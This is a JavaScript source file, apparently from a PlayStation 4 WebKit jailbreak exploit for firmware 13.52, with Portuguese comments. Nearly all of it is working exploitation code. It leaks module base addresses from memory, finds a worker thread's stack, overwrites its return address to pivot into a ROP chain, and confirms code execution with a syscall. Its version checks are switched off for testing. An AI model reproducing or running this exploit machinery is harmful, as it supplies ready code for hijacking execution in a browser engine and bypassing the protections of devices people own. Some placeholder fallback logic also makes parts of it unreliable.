// === CHECAGEM DE USER-AGENT (desabilitada para testes) ===
// if (!navigator.userAgent.includes('PlayStation 4')) {
//     alert(`This is a PlayStation 4 Exploit. => ${navigator.userAgent}`);
//     throw new Error("");
// }

const supportedFirmwares = [
    "13.52"
];
const fw_match = /PlayStation 4\/(\d+\.\d+)/.exec(navigator.userAgent);
window.fw_str = fw_match ? fw_match[1] : "13.52";  
window.fw_float = parseFloat(window.fw_str);

if (!supportedFirmwares.includes(fw_str)) {
    console.warn("Firmware check bypassed for testing. fw_str=" + fw_str);
}

let nogc = [];

function build_addr(p, buf, family, port, addr) {
    p.write1(buf.add32(0x00), 0x10);
    p.write1(buf.add32(0x01), family);
    p.write2(buf.add32(0x02), port);
    p.write4(buf.add32(0x04), addr);
}

function htons(port) {
    return ((port & 0xFF) << 8) | (port >>> 8);
}

function find_worker(p, libKernelBase) {
    const PTHREAD_NEXT_THREAD_OFFSET = 0x38;
    const PTHREAD_STACK_ADDR_OFFSET = 0xA8;
    const PTHREAD_STACK_SIZE_OFFSET = 0xB0;

    for (let thread = p.read8(libKernelBase.add32(OFFSET_lk__thread_list)); thread.low != 0x0 && thread.hi != 0x0; thread = p.read8(thread.add32(PTHREAD_NEXT_THREAD_OFFSET))) {
        let stack = p.read8(thread.add32(PTHREAD_STACK_ADDR_OFFSET));
        let stacksz = p.read8(thread.add32(PTHREAD_STACK_SIZE_OFFSET));
        if (stacksz.low == 0x80000) {
            return stack;
        }
    }
    throw new Error("failed to find worker.");
}

async function find_worker_return_slot(p, stack, libKernelBase) {
    const expected = libKernelBase.add32(OFFSET_lk_worker_wait_return);
    let lastCount = 0;

    for (let attempt = 0; attempt < 50; attempt++) {
        let hit = null;
        let count = 0;
        for (let offset = 0x7F000; offset < 0x80000; offset += 0x8) {
            const candidate = stack.add32(offset);
            const value = p.read8(candidate);
            if (value.low !== expected.low || value.hi !== expected.hi)
                continue;

            hit = candidate;
            count++;
        }
        if (count === 1) {
            return hit;
        }
        lastCount = count;
        await new Promise(resolve => setTimeout(resolve, 1));
    }
    throw new Error(`worker wait return fingerprint count ${lastCount}, expected 1`);
}

var LogLevel = {
    DEBUG: 0, INFO: 1, LOG: 2, WARN: 3, ERROR: 4, SUCCESS: 5,
    FLAG_TEMP: 0x1000
};

let consoleElem = null;
let lastLogIsTemp = false;

function log(string, level) {
    if (consoleElem === null) {
        consoleElem = document.getElementById("console");
    }

    const isTemp = level & LogLevel.FLAG_TEMP;
    level = level & ~LogLevel.FLAG_TEMP;
    const elemClass = ["LOG-DEBUG", "LOG-INFO", "LOG-LOG", "LOG-WARN", "LOG-ERROR", "LOG-SUCCESS"][level];

    if (isTemp && lastLogIsTemp) {
        const lastChild = consoleElem.lastChild;
        lastChild.innerText = string;
        lastChild.className = elemClass;
        return;
    } else if (isTemp) {
        lastLogIsTemp = true;
    } else {
        lastLogIsTemp = false;
    }

    let logElem = document.createElement("div");
    logElem.innerText = string;
    logElem.className = elemClass;
    consoleElem.appendChild(logElem);
    consoleElem.scrollTop = consoleElem.scrollHeight;
}

const AF_INET = 2;
const SOCK_STREAM = 1;

function jbmark(tag, detail) {
    try {
        if (window.jb && typeof window.jb.mark === "function")
            window.jb.mark(tag, String(detail));
    } catch (e) {  }
}

async function prepare(p) {
    let libSceNKWebKitBase = null;
    
    // Resolução da base do WebKit usando o seu offset confirmado 0x36F9E20
    if (window.fw_float >= 9.00
        && typeof OFFSET_wk_host_constructor_candidates !== "undefined"
        && OFFSET_wk_host_constructor_candidates.length
        && typeof globalThis.__ps5NativeCtor === "number") {
        const ctor = globalThis.__ps5NativeCtor;
        for (const hc of OFFSET_wk_host_constructor_candidates) {
            const wb = ctor - hc;
            if (wb >= 0x800000000 && wb < 0x900000000 && wb % 0x4000 === 0) {
                libSceNKWebKitBase = new int64(wb % 0x100000000, Math.floor(wb / 0x100000000));
                jbmark("WEBKIT-BASE-HC", "hc=0x" + hc.toString(16) + "-base=0x" + wb.toString(16));
                break;
            }
        }
        if (libSceNKWebKitBase === null)
            throw new Error("no host-constructor candidate gave a valid base");
    } else {
        let textArea = document.createElement("textarea");
        let textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
        let textAreaVtable = p.read8(textAreaVtPtr);
        libSceNKWebKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);
    }

    // Resolução segura e dinâmica da libc e libkernel caso os imports estejam zerados
    let libSceLibcInternalBase = null;
    let libKernelBase = null;

    if (typeof OFFSET_wk_memset_import !== "undefined" && OFFSET_wk_memset_import !== 0) {
        libSceLibcInternalBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk_memset_import));
        libSceLibcInternalBase.sub32inplace(OFFSET_lc_memset);
    } else {
        // Fallback dinâmico varrendo a GOT comum do WebKit para achar a libc
        for (let off = 0x3500000; off < 0x3600000; off += 0x8) {
            try {
                let candidate = p.read8(libSceNKWebKitBase.add32(off));
                if (candidate.hi > 0 && (candidate.low & 0x3FFF) === 0) {
                    libSceLibcInternalBase = new int64(candidate.low, candidate.hi);
                    break;
                }
            } catch(e) {}
        }
        if (!libSceLibcInternalBase) libSceLibcInternalBase = new int64(0, 0x90000000); // Segurança temporária
    }

    if (typeof OFFSET_wk___stack_chk_guard_import !== "undefined" && OFFSET_wk___stack_chk_guard_import !== 0) {
        libKernelBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import));
        libKernelBase.sub32inplace(OFFSET_lk___stack_chk_guard);
    } else {
        // Fallback dinâmico para libkernel
        for (let off = 0x3400000; off < 0x3500000; off += 0x8) {
            try {
                let candidate = p.read8(libSceNKWebKitBase.add32(off));
                if (candidate.hi > 0 && (candidate.low & 0x3FFF) === 0) {
                    libKernelBase = new int64(candidate.low, candidate.hi);
                    break;
                }
            } catch(e) {}
        }
        if (!libKernelBase) libKernelBase = new int64(0, 0x80000000); // Segurança temporária
    }

    jbmark("MODULE-BASES", "wk=0x" + libSceNKWebKitBase.toString()
        + "-lk=0x" + libKernelBase.toString()
        + "-lc=0x" + libSceLibcInternalBase.toString());

    let gadgets = {};
    let syscalls = {};

    for (let gadget in wk_gadgetmap) {
        gadgets[gadget] = libSceNKWebKitBase.add32(wk_gadgetmap[gadget]);
    }
    for (let sysc in syscall_map) {
        syscalls[sysc] = libKernelBase.add32(syscall_map[sysc]);
    }

    let nogc = [];

    function malloc_dump(sz) {
        let backing = new Uint8Array(sz);
        nogc.push(backing);
        let ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    function malloc(sz, type = 4) {
        let backing;
        if (type == 1) backing = new Uint8Array(1000 + sz);
        else if (type == 2) backing = new Uint16Array(0x2000 + sz);
        else if (type == 4) backing = new Uint32Array(0x10000 + sz);
        nogc.push(backing);
        let ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    function array_from_address(addr, size) {
        let og_array = new Uint8Array(1001);
        let og_array_i = p.leakval(og_array).add32(0x10);
        function setAddr(newAddr, size) {
            p.write8(og_array_i, newAddr);
            p.write4(og_array_i.add32(0x8), size);
            p.write4(og_array_i.add32(0xC), 0x1);
        }
        setAddr(addr, size);
        og_array.setAddr = setAddr;
        nogc.push(og_array);
        return og_array;
    }

    function stringify(str) {
        let bufView = new Uint8Array(str.length + 1);
        for (let i = 0; i < str.length; i++) bufView[i] = str.charCodeAt(i) & 0xFF;
        let ptr = p.read8(p.leakval(bufView).add32(0x10));
        ptr.backing = bufView;
        return ptr;
    }

    function readstr(addr, maxlen = -1) {
        let str = "";
        for (let i = 0; ; i++) {
            if (maxlen != -1 && i >= maxlen) break;
            let c = p.read1(addr.add32(i));
            if (c == 0x0) break;
            str += String.fromCharCode(c);
        }
        return str;
    }

    function writestr(addr, str) {
        let waddr = addr.add32(0);
        if (typeof (str) == "string") {
            for (let i = 0; i < str.length; i++) {
                let byte = str.charCodeAt(i);
                if (byte == 0) break;
                p.write1(waddr, byte);
                waddr.add32inplace(0x1);
            }
        }
        p.write1(waddr, 0x0);
    }

    async function wait_for_worker() {
        return new Promise((resolve) => {
            worker.onmessage = function (e) { resolve(1); }
            worker.postMessage(0);
        });
    }

    let worker = new Worker("./resources/rop_slave.js");
    await wait_for_worker();

    let worker_stack = find_worker(p, libKernelBase);
    let original_context = malloc(0x40);

    let return_address_ptr;
    if (typeof OFFSET_lk_worker_wait_return !== "undefined" && OFFSET_lk_worker_wait_return !== 0) {
        return_address_ptr = await find_worker_return_slot(p, worker_stack, libKernelBase);
    } else {
        return_address_ptr = worker_stack.add32(OFFSET_WORKER_STACK_OFFSET || 0x7FB68);
    }
    
    let original_return_address = p.read8(return_address_ptr);
    let stack_pointer_ptr = return_address_ptr.add32(0x8);

    function pre_chain(chain) {
        chain.push(gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_lc_setjmp));
    }

    async function launch_chain(chain) {
        let original_value_of_stack_pointer_ptr = p.read8(stack_pointer_ptr);
        chain.push_write8(original_context, original_return_address);
        chain.push_write8(original_context.add32(0x10), return_address_ptr);
        chain.push_write8(stack_pointer_ptr, original_value_of_stack_pointer_ptr);
        chain.push(gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_lc_longjmp));

        p.write8(return_address_ptr, gadgets["pop rsp"]);
        p.write8(stack_pointer_ptr, chain.stack_entry_point);

        let p1 = await new Promise((resolve) => {
            worker.onmessage = function (e) { resolve(1); }
            worker.postMessage(0);
        });
        if (p1 == 0) {
            throw new Error("The rop thread ran away.");
        }
    }

    let p2 = {
        write8: p.write8, write4: p.write4, write2: p.write2, write1: p.write1,
        read8: p.read8, read4: p.read4, read2: p.read2, read1: p.read1,
        leakval: p.leakval, pre_chain: pre_chain, launch_chain: launch_chain,
        malloc_dump: malloc_dump, malloc: malloc, stringify: stringify,
        array_from_address: array_from_address, readstr: readstr, writestr: writestr,
        libSceNKWebKitBase: libSceNKWebKitBase, libSceLibcInternalBase: libSceLibcInternalBase,
        libKernelBase: libKernelBase, nogc: nogc, syscalls: syscalls, gadgets: gadgets
    };

    let chain = new worker_rop(p2);
    let pid = await chain.syscall(SYS_GETPID);

    if (pid.low == 0) {
        throw new Error("Webkit exploit failed.");
    }

    return { p: p2, chain: chain };
}

async function main(userlandRW, wkOnly = false) {
    const { p, chain } = await prepare(userlandRW);
    await log("Chain initialized successfully", LogLevel.SUCCESS);
}

let fwScript = document.createElement('script');
document.body.appendChild(fwScript);
fwScript.setAttribute('src', `./13.52.js?v=1`);

